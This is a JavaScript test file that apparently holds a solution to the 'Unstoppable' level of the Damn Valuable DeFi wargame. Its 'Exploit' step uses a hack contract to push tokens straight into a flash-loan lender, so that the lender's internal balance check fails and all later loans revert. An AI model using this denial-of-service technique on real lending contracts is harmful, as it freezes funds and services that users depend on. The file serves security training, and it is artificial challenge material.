const { ether, expectRevert } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');

const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
const UnstoppableLender = contract.fromArtifact('UnstoppableLender');
const ReceiverContract = contract.fromArtifact('ReceiverUnstoppable');
const HackContract = contract.fromArtifact('HackUnstoppable');

const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {

    const [deployer, attacker, someUser, ...otherAccounts] = accounts;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ether('1000000');
    const INITIAL_ATTACKER_BALANCE = ether('100');

    before(async function () {
        /** SETUP SCENARIO */
        this.token = await DamnValuableToken.new({ from: deployer });
        this.pool = await UnstoppableLender.new(this.token.address, { from: deployer });

        await this.token.approve(this.pool.address, TOKENS_IN_POOL, { from: deployer });
        await this.pool.depositTokens(TOKENS_IN_POOL, { from: deployer });

        await this.token.transfer(attacker, INITIAL_ATTACKER_BALANCE, { from: deployer });

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.bignumber.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker)
        ).to.be.bignumber.equal(INITIAL_ATTACKER_BALANCE);

         // Show it's possible for anyone to take out a flash loan
         this.receiverContract = await ReceiverContract.new(this.pool.address, { from: someUser });
         await this.receiverContract.executeFlashLoan(10, { from: someUser });
    });

    it('Exploit', async function () {
        // this exploit uses the flash loan mechanism of the contract to bypass
        // `depositTokens` method and increase the token balance of the lender
        // contract hence leaving `poolBalance` out of sync
        // lender contract will throw on the next `flashLoan` call since
        // the`assert(poolBalance == balanceBefore)` line will throw
        this.hack = await HackContract.new(this.pool.address, this.token.address, { from: attacker });
        await this.token.approve(this.hack.address, 1, { from: attacker });
        await this.hack.depositTokens({from: attacker});
        await this.hack.executeFlashLoan(10, { from: attacker });
    });

    after(async function () {
        /** SUCCESS CONDITION */
        await expectRevert.unspecified(
            this.receiverContract.executeFlashLoan(10, { from: someUser })
        );
    });
});
